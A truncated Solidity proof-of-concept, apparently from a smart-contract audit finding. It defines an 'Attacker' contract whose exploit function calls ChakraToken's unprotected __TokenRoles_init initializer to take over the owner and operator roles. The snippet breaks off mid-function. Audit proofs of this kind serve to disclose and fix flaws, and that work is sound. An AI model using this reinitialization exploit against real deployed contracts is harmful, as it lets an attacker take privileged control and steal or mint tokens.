import "./ChakraToken.sol";  // Assuming ChakraToken contract is already deployed

contract Attacker {
    ChakraToken public targetContract;

    constructor(address _target) {
        // Initialize with the vulnerable ChakraToken contract's address
        targetContract = ChakraToken(_target);
    }

    // Exploit function to reinitialize the vulnerable contract and gain ownership and operator role
    function exploit() public {
        // Call the vulnerable __TokenRoles_init function with attacker's address as owner and operator
        targetContract.__TokenRoles_init(msg.sender, msg.sender);
